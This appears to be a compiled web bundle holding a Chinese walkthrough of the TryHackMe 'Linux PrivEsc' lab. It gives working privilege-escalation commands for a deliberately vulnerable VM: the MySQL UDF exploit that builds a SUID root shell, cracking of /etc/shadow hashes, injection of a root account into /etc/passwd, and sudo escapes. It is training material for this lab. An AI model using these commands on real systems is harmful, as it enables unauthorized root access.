"use strict";(self.webpackChunktryhackne_cn=self.webpackChunktryhackne_cn||[]).push([[395],{7073:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>o,contentTitle:()=>i,default:()=>t,frontMatter:()=>c,metadata:()=>d,toc:()=>h});var l=n(5893),r=n(1151);const c={sidebar_position:3},i="Linux PrivEsc - Linux \u7279\u6743\u63d0\u5347",d={id:"Modules/Shells-and-Privilege-Escalation/Linux-PrivEsc",title:"Linux PrivEsc - Linux \u7279\u6743\u63d0\u5347",description:"TryHackMe | Linux PrivEsc",source:"@site/docs/Modules/Shells-and-Privilege-Escalation/Linux-PrivEsc.md",sourceDirName:"Modules/Shells-and-Privilege-Escalation",slug:"/Modules/Shells-and-Privilege-Escalation/Linux-PrivEsc",permalink:"/Tryhackme-CN/docs/Modules/Shells-and-Privilege-Escalation/Linux-PrivEsc",draft:!1,unlisted:!1,editUrl:"https://github.com/CTF-Archives/Tryhackme-CN/edit/main/docs/Modules/Shells-and-Privilege-Escalation/Linux-PrivEsc.md",tags:[],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3},sidebar:"Modules_Sidebar",previous:{title:"Common Linux Privesc - \u5e38\u89c1\u7684 Linux \u7279\u6743\u63d0\u5347\u65b9\u5f0f",permalink:"/Tryhackme-CN/docs/Modules/Shells-and-Privilege-Escalation/Common-Linux-Privesc"}},o={},h=[{value:"\u90e8\u7f72\u6613\u53d7\u653b\u51fb\u7684 Debian \u865a\u62df\u673a",id:"\u90e8\u7f72\u6613\u53d7\u653b\u51fb\u7684-debian-\u865a\u62df\u673a",level:2},{value:"\u670d\u52a1\u6f0f\u6d1e\u5229\u7528",id:"\u670d\u52a1\u6f0f\u6d1e\u5229\u7528",level:2},{value:"\u5f31\u6587\u4ef6\u6743\u9650 - \u53ef\u8bfb\u53d6 /etc/shadow",id:"\u5f31\u6587\u4ef6\u6743\u9650---\u53ef\u8bfb\u53d6-etcshadow",level:2},{value:"\u5f31\u6587\u4ef6\u6743\u9650 - \u53ef\u5199\u5165 /etc/shadow",id:"\u5f31\u6587\u4ef6\u6743\u9650---\u53ef\u5199\u5165-etcshadow",level:2},{value:"\u5f31\u6587\u4ef6\u6743\u9650 - \u53ef\u5199\u5165 /etc/passwd",id:"\u5f31\u6587\u4ef6\u6743\u9650---\u53ef\u5199\u5165-etcpasswd",level:2},{value:"Sudo - Shell \u9003\u9038\u5e8f\u5217",id:"sudo---shell-\u9003\u9038\u5e8f\u5217",level:2},{value:"Sudo - \u73af\u5883\u53d8\u91cf",id:"sudo---\u73af\u5883\u53d8\u91cf",level:2},{value:"\u5b9a\u65f6\u4efb\u52a1 - \u6587\u4ef6\u6743\u9650",id:"\u5b9a\u65f6\u4efb\u52a1---\u6587\u4ef6\u6743\u9650",level:2},{value:"\u5b9a\u65f6\u4efb\u52a1 - PATH \u73af\u5883\u53d8\u91cf",id:"\u5b9a\u65f6\u4efb\u52a1---path-\u73af\u5883\u53d8\u91cf",level:2},{value:"\u5b9a\u65f6\u4efb\u52a1 - \u901a\u914d\u7b26",id:"\u5b9a\u65f6\u4efb\u52a1---\u901a\u914d\u7b26",level:2},{value:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u5df2\u77e5\u6f0f\u6d1e",id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u5df2\u77e5\u6f0f\u6d1e",level:2},{value:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u5171\u4eab\u5bf9\u8c61\u6ce8\u5165",id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u5171\u4eab\u5bf9\u8c61\u6ce8\u5165",level:2},{value:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u73af\u5883\u53d8\u91cf",id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u73af\u5883\u53d8\u91cf",level:2},{value:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u6ee5\u7528 Shell \u529f\u80fd\uff08#1\uff09",id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u6ee5\u7528-shell-\u529f\u80fd1",level:2},{value:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u6ee5\u7528 Shell \u529f\u80fd\uff08#2\uff09",id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u6ee5\u7528-shell-\u529f\u80fd2",level:2},{value:"\u5bc6\u7801\u4e0e\u5bc6\u94a5 - \u5386\u53f2\u6587\u4ef6",id:"\u5bc6\u7801\u4e0e\u5bc6\u94a5---\u5386\u53f2\u6587\u4ef6",level:2},{value:"\u5bc6\u7801\u4e0e\u5bc6\u94a5 - \u914d\u7f6e\u6587\u4ef6",id:"\u5bc6\u7801\u4e0e\u5bc6\u94a5---\u914d\u7f6e\u6587\u4ef6",level:2},{value:"\u5bc6\u7801\u4e0e\u5bc6\u94a5 - SSH \u5bc6\u94a5",id:"\u5bc6\u7801\u4e0e\u5bc6\u94a5---ssh-\u5bc6\u94a5",level:2},{value:"NFS",id:"nfs",level:2},{value:"\u5185\u6838\u6f0f\u6d1e\u5229\u7528",id:"\u5185\u6838\u6f0f\u6d1e\u5229\u7528",level:2},{value:"\u7279\u6743\u5347\u7ea7\u811a\u672c",id:"\u7279\u6743\u5347\u7ea7\u811a\u672c",level:2}];function a(e){const s={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",p:"p",pre:"pre",...(0,r.a)(),...e.components},{Details:n}=s;return n||function(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(s.h1,{id:"linux-privesc---linux-\u7279\u6743\u63d0\u5347",children:"Linux PrivEsc - Linux \u7279\u6743\u63d0\u5347"}),"\n",(0,l.jsxs)(s.blockquote,{children:["\n",(0,l.jsx)(s.p,{children:(0,l.jsx)(s.a,{href:"https://tryhackme.com/room/linuxprivesc",children:"TryHackMe | Linux PrivEsc"})}),"\n",(0,l.jsx)(s.p,{children:"Updated in 2023-12-20"}),"\n",(0,l.jsxs)(s.p,{children:["\u5728\u4e00\u4e2a\u7279\u610f\u914d\u7f6e\u9519\u8bef\u7684 Debian \u865a\u62df\u673a\u4e0a\u7ec3\u4e60\u4f60\u7684 Linux \u7279\u6743\u63d0\u5347\u6280\u80fd\uff0c\u6709\u591a\u79cd\u65b9\u5f0f\u53ef\u4ee5\u83b7 \\ n\\n \u53d6 root \u6743\u9650\uff01SSH \u53ef\u7528\u3002\u51ed\u8bc1\uff1auser",":password321"]}),"\n",(0,l.jsxs)(s.p,{children:["Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user",":password321"]}),"\n"]}),"\n",(0,l.jsx)(s.h2,{id:"\u90e8\u7f72\u6613\u53d7\u653b\u51fb\u7684-debian-\u865a\u62df\u673a",children:"\u90e8\u7f72\u6613\u53d7\u653b\u51fb\u7684 Debian \u865a\u62df\u673a"}),"\n",(0,l.jsx)(s.p,{children:"\u8fd9\u4e2a\u623f\u95f4\u65e8\u5728\u5f15\u5bfc\u4f60\u4e86\u89e3\u5404\u79cd Linux \u7279\u6743\u63d0\u5347\u6280\u672f\u3002\u4e3a\u6b64\uff0c\u4f60\u9996\u5148\u9700\u8981\u90e8\u7f72\u4e00\u4e2a\u6709\u610f\u8bbe\u5b9a\u7684\u6613\u53d7\u653b\u51fb\u7684 Debian \u865a\u62df\u673a\u3002\u8fd9\u4e2a\u865a\u62df\u673a\u6700\u521d\u662f\u7531 Sagi Shahar \u521b\u5efa\u7684\uff0c\u4f5c\u4e3a\u4ed6\u672c\u5730\u7279\u6743\u63d0\u5347\u7814\u8ba8\u4f1a\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u5df2\u7ecf\u7531 Tib3rius \u5728 Udemy \u7684\u300aLinux \u7279\u6743\u63d0\u5347\u2014\u2014\u9488\u5bf9 OSCP \u53ca\u66f4\u591a\uff01\u300b\u8bfe\u7a0b\u4e2d\u8fdb\u884c\u4e86\u66f4\u65b0\u3002\u5728\u90a3\u91cc\u53ef\u4ee5\u627e\u5230\u5bf9\u672c\u623f\u95f4\u4e2d\u4f7f\u7528\u7684\u5404\u79cd\u6280\u672f\u7684\u8be6\u7ec6\u89e3\u91ca\uff0c\u4ee5\u53ca\u6709\u5173\u5728 Linux \u4e2d\u627e\u5230\u7279\u6743\u63d0\u5347\u7684\u6f14\u793a\u548c\u63d0\u793a\u3002"}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsxs)(s.p,{children:["\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"id"})," \u547d\u4ee4\u3002 \u7ed3\u679c\u662f\u4ec0\u4e48\uff1f"]}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"\u670d\u52a1\u6f0f\u6d1e\u5229\u7528",children:"\u670d\u52a1\u6f0f\u6d1e\u5229\u7528"}),"\n",(0,l.jsx)(s.p,{children:'MySQL \u670d\u52a1\u6b63\u5728\u4ee5 root \u8eab\u4efd\u8fd0\u884c\uff0c\u5e76\u4e14\u670d\u52a1\u7684 "root" \u7528\u6237\u672a\u8bbe\u7f6e\u5bc6\u7801\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e00\u79cd\u5e38\u89c1\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\uff0c\u5229\u7528\u7528\u6237\u5b9a\u4e49\u51fd\u6570\uff08UDF\uff09\u901a\u8fc7 MySQL \u670d\u52a1\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u7cfb\u7edf\u547d\u4ee4\u3002'}),"\n",(0,l.jsxs)(s.p,{children:["\u5207\u6362\u5230 ",(0,l.jsx)(s.code,{children:"/home/user/tools/mysql-udf"})," \u76ee\u5f55\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cd /home/user/tools/mysql-udf\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u7f16\u8bd1 ",(0,l.jsx)(s.code,{children:"raptor_udf2.c"})," \u6f0f\u6d1e\u5229\u7528\u4ee3\u7801\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"gcc -g -c raptor_udf2.c -fPIC\ngcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u4ee5 root \u7528\u6237\u8eab\u4efd\u4f7f\u7528\u7a7a\u767d\u5bc6\u7801\u8fde\u63a5\u5230 MySQL \u670d\u52a1\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"mysql -u root\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5728 MySQL shell \u4e2d\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"do_system"})," \u7684\u7528\u6237\u5b9a\u4e49\u51fd\u6570\uff08UDF\uff09\uff0c\u4f7f\u7528\u6211\u4eec\u7f16\u8bd1\u7684\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-sql",children:"use mysql;\ncreate table foo(line blob);\ninsert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));\nselect * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';\ncreate function do_system returns integer soname 'raptor_udf2.so';\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4f7f\u7528\u8be5\u51fd\u6570\u5c06 ",(0,l.jsx)(s.code,{children:"/bin/bash"})," \u590d\u5236\u5230 ",(0,l.jsx)(s.code,{children:"/tmp/rootbash"})," \uff0c\u5e76\u8bbe\u7f6e SUID \u6743\u9650\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-sql",children:"select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u9000\u51fa MySQL shell\uff08\u8f93\u5165 ",(0,l.jsx)(s.code,{children:"exit"})," \u6216 ",(0,l.jsx)(s.code,{children:"\\q"})," \u7136\u540e\u6309 Enter\uff09\uff0c\u7136\u540e\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"/tmp/rootbash"})," \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528 -p \u53c2\u6570\u83b7\u53d6\u4e00\u4e2a\u5177\u6709 root \u6743\u9650\u7684 shell\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/tmp/rootbash -p\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u5220\u9664 ",(0,l.jsx)(s.code,{children:"/tmp/rootbash"})," \u53ef\u6267\u884c\u6587\u4ef6\u5e76\u9000\u51fa root shell\uff0c\u56e0\u4e3a\u4f60\u5c06\u5728\u540e\u9762\u7684\u6b65\u9aa4\u4e2d\u518d\u6b21\u521b\u5efa\u8fd9\u4e2a\u6587\u4ef6\uff01"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"rm /tmp/rootbash\nexit\n"})}),"\n",(0,l.jsx)(s.h2,{id:"\u5f31\u6587\u4ef6\u6743\u9650---\u53ef\u8bfb\u53d6-etcshadow",children:"\u5f31\u6587\u4ef6\u6743\u9650 - \u53ef\u8bfb\u53d6 /etc/shadow"}),"\n",(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"/etc/shadow"})," \u6587\u4ef6\u5305\u542b\u7528\u6237\u5bc6\u7801\u54c8\u5e0c\u503c\uff0c\u901a\u5e38\u53ea\u6709 root \u7528\u6237\u53ef\u8bfb\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0c\u865a\u62df\u673a\u4e0a\u7684 ",(0,l.jsx)(s.code,{children:"/etc/shadow"})," \u6587\u4ef6\u53ef\u4ee5\u88ab\u6240\u6709\u7528\u6237\u8bfb\u53d6\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ls -l /etc/shadow\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u67e5\u770b /etc/shadow \u6587\u4ef6\u7684\u5185\u5bb9\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cat /etc/shadow\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e00\u884c\u4ee3\u8868\u4e00\u4e2a\u7528\u6237\u3002\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\uff08\u5982\u679c\u5b58\u5728\uff09\u53ef\u4ee5\u5728\u6bcf\u884c\u7684\u7b2c\u4e00\u4e2a\u5192\u53f7\uff08:\uff09\u548c\u7b2c\u4e8c\u4e2a\u5192\u53f7\uff08:\uff09\u4e4b\u95f4\u627e\u5230\u3002"}),"\n",(0,l.jsxs)(s.p,{children:["\u5c06 root \u7528\u6237\u7684\u54c8\u5e0c\u4fdd\u5b58\u5230\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"hash.txt"})," \u7684\u6587\u4ef6\u4e2d\uff0c\u5e76\u4f7f\u7528 ",(0,l.jsx)(s.code,{children:"John the Ripper"})," \u8fdb\u884c\u7834\u89e3\u3002\u6839\u636e\u4f60\u4f7f\u7528\u7684 Kali \u7248\u672c\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u5148\u89e3\u538b ",(0,l.jsx)(s.code,{children:"/usr/share/wordlists/rockyou.txt.gz"})," \u6587\u4ef6\uff0c\u5e76\u4f7f\u7528 sudo \u8fd0\u884c\u8be5\u547d\u4ee4\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4f7f\u7528\u7834\u89e3\u540e\u7684\u5bc6\u7801\u5207\u6362\u5230 ",(0,l.jsx)(s.code,{children:"root"})," \u7528\u6237\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"su root\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(s.p,{children:"\u6839\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0\n"})}),(0,l.jsx)(s.p,{children:"\u7528\u4e8e\u751f\u6210\u6839\u7528\u6237\u5bc6\u7801\u54c8\u5e0c\u7684\u54c8\u5e0c\u7b97\u6cd5\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsxs)(n,{children:[(0,l.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"$john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword123      (?)\n1g 0:00:00:00 DONE (2023-12-20 14:01) 4.347g/s 6678p/s 6678c/s 6678C/s kucing..mexico1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n"})})]}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"sha512crypt\n"})}),(0,l.jsx)(s.p,{children:"\u6839\u7528\u6237\u7684\u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"password123\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"\u5f31\u6587\u4ef6\u6743\u9650---\u53ef\u5199\u5165-etcshadow",children:"\u5f31\u6587\u4ef6\u6743\u9650 - \u53ef\u5199\u5165 /etc/shadow"}),"\n",(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"/etc/shadow"})," \u6587\u4ef6\u5305\u542b\u7528\u6237\u5bc6\u7801\u54c8\u5e0c\u503c\uff0c\u901a\u5e38\u53ea\u6709 root \u7528\u6237\u53ef\u8bfb\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0c\u865a\u62df\u673a\u4e0a\u7684 ",(0,l.jsx)(s.code,{children:"/etc/shadow"})," \u6587\u4ef6\u53ef\u4ee5\u88ab\u6240\u6709\u7528\u6237\u5199\u5165\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ls -l /etc/shadow\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u4f7f\u7528\u4f60\u9009\u62e9\u7684\u5bc6\u7801\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u5bc6\u7801\u54c8\u5e0c\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"mkpasswd -m sha-512 newpasswordhere\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u7f16\u8f91 ",(0,l.jsx)(s.code,{children:"/etc/shadow"})," \u6587\u4ef6\uff0c\u5c06\u539f\u59cb root \u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u66ff\u6362\u4e3a\u4f60\u521a\u751f\u6210\u7684\u65b0\u54c8\u5e0c\u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u4f7f\u7528\u65b0\u5bc6\u7801\u5207\u6362\u5230 root \u7528\u6237\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"su root\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"\u5f31\u6587\u4ef6\u6743\u9650---\u53ef\u5199\u5165-etcpasswd",children:"\u5f31\u6587\u4ef6\u6743\u9650 - \u53ef\u5199\u5165 /etc/passwd"}),"\n",(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"/etc/passwd"})," \u6587\u4ef6\u5305\u542b\u7528\u6237\u8d26\u6237\u7684\u4fe1\u606f\u3002\u5b83\u53ef\u4ee5\u88ab\u6240\u6709\u7528\u6237\u8bfb\u53d6\uff0c\u4f46\u901a\u5e38\u53ea\u6709 root \u7528\u6237\u53ef\u5199\u3002\u5728\u5386\u53f2\u4e0a\uff0c",(0,l.jsx)(s.code,{children:"/etc/passwd"})," \u6587\u4ef6\u5305\u542b\u7528\u6237\u5bc6\u7801\u54c8\u5e0c\u503c\uff0c\u4e00\u4e9b Linux \u7248\u672c\u4ecd\u7136\u5141\u8bb8\u5728\u90a3\u91cc\u5b58\u50a8\u5bc6\u7801\u54c8\u5e0c\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0c\u865a\u62df\u673a\u4e0a\u7684 ",(0,l.jsx)(s.code,{children:"/etc/passwd"})," \u6587\u4ef6\u53ef\u4ee5\u88ab\u6240\u6709\u7528\u6237\u5199\u5165\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ls -l /etc/passwd\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u4f7f\u7528\u4f60\u9009\u62e9\u7684\u5bc6\u7801\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u5bc6\u7801\u54c8\u5e0c\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"openssl passwd newpasswordhere\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u7f16\u8f91 ",(0,l.jsx)(s.code,{children:"/etc/passwd"}),' \u6587\u4ef6\uff0c\u5728 root \u7528\u6237\u7684\u884c\u4e2d\u7b2c\u4e00\u4e2a\u5192\u53f7\uff08:\uff09\u548c\u7b2c\u4e8c\u4e2a\u5192\u53f7\uff08:\uff09\u4e4b\u95f4\uff08\u66ff\u6362 "x"\uff09\uff0c\u653e\u7f6e\u751f\u6210\u7684\u5bc6\u7801\u54c8\u5e0c\u3002']}),"\n",(0,l.jsxs)(s.p,{children:["\u6216\u8005\uff0c\u590d\u5236 root \u7528\u6237\u7684\u884c\u5e76\u5c06\u5176\u8ffd\u52a0\u5230\u6587\u4ef6\u5e95\u90e8\uff0c\u5c06\u7b2c\u4e00\u4e2a ",(0,l.jsx)(s.code,{children:"root"})," \u66f4\u6539\u4e3a ",(0,l.jsx)(s.code,{children:"newroot"}),' \uff0c\u5e76\u5728\u7b2c\u4e00\u4e2a\u5192\u53f7\uff08\u66ff\u6362 "x"\uff09\u4e4b\u95f4\u653e\u7f6e\u751f\u6210\u7684\u5bc6\u7801\u54c8\u5e0c\u3002']}),"\n",(0,l.jsx)(s.p,{children:"\u73b0\u5728\u4f7f\u7528\u65b0\u5bc6\u7801\u5207\u6362\u5230 newroot \u7528\u6237\uff1a"}),"\n",(0,l.jsx)(s.p,{children:"\u4f7f\u7528\u65b0\u5bc6\u7801\u5207\u6362\u5230 root \u7528\u6237\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"su root\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"su root\n"})}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(s.p,{children:'\u4ee5 newroot \u7528\u6237\u8eab\u4efd\u8fd0\u884c "id" \u547d\u4ee4\u3002\u7ed3\u679c\u662f\u4ec0\u4e48\uff1f'}),(0,l.jsxs)(n,{children:[(0,l.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,l.jsx)(s.p,{children:"\u9996\u5148\uff0c\u5148\u751f\u6210\u4e00\u4efd\u5bc6\u7801\u54c8\u5e0c"}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"user@debian:~$ openssl passwd newpasswordhere\nWarning: truncating password to 8 characters\nbiLFGpooiO5HQ\n"})}),(0,l.jsxs)(s.p,{children:["\u751f\u6210\u4ee5\u4e0b\u6570\u636e\u63d2\u5165\u5230 ",(0,l.jsx)(s.code,{children:"/etc/passwd"})]}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"newroot:biLFGpooiO5HQ:0:0:root:/root:/bin/bash\n"})})]}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"uid=0(root) gid=0(root) groups=0(root)\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"sudo---shell-\u9003\u9038\u5e8f\u5217",children:"Sudo - Shell \u9003\u9038\u5e8f\u5217"}),"\n",(0,l.jsx)(s.p,{children:"\u5217\u51fa sudo \u5141\u8bb8\u4f60\u7684\u7528\u6237\u8fd0\u884c\u7684\u7a0b\u5e8f\u3002"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"sudo -l\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bbf\u95ee ",(0,l.jsx)(s.a,{href:"https://gtfobins.github.io",children:"GTFOBins - https://gtfobins.github.io"}),' \uff0c\u641c\u7d22\u4e00\u4e9b\u7a0b\u5e8f\u540d\u79f0\u3002\u5982\u679c\u7a0b\u5e8f\u5728\u5217\u8868\u4e2d\u663e\u793a\u6709 "sudo" \u4f5c\u4e3a\u4e00\u4e2a\u529f\u80fd\uff0c\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u901a\u8fc7\u9003\u9038\u5e8f\u5217\u63d0\u5347\u6743\u9650\u3002']}),"\n",(0,l.jsx)(s.p,{children:"\u4ece\u5217\u8868\u4e2d\u9009\u62e9\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5e76\u5c1d\u8bd5\u6309\u7167 GTFOBins \u4e0a\u7684\u8bf4\u660e\u83b7\u5f97 root shell\u3002"}),"\n",(0,l.jsx)(s.p,{children:"\u4f5c\u4e3a\u989d\u5916\u6311\u6218\uff0c\u5c1d\u8bd5\u4f7f\u7528\u5217\u8868\u4e2d\u7684\u6240\u6709\u7a0b\u5e8f\u83b7\u5f97 root shell\uff01"}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"user"})," \u88ab\u5141\u8bb8\u901a\u8fc7 sudo \u8fd0\u884c\u591a\u5c11\u4e2a\u7a0b\u5e8f\uff1f"]}),(0,l.jsxs)(n,{children:[(0,l.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"$ sudo -l\nMatching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n\nUser user may run the following commands on this host:\n    (root) NOPASSWD: /usr/sbin/iftop\n    (root) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /usr/bin/nano\n    (root) NOPASSWD: /usr/bin/vim\n    (root) NOPASSWD: /usr/bin/man\n    (root) NOPASSWD: /usr/bin/awk\n    (root) NOPASSWD: /usr/bin/less\n    (root) NOPASSWD: /usr/bin/ftp\n    (root) NOPASSWD: /usr/bin/nmap\n    (root) NOPASSWD: /usr/sbin/apache2\n    (root) NOPASSWD: /bin/more\n"})})]}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"11\n"})}),(0,l.jsx)(s.p,{children:"\u5217\u8868\u4e2d\u6709\u4e00\u4e2a\u7a0b\u5e8f\u5728 GTFOBins \u4e0a\u6ca1\u6709 shell 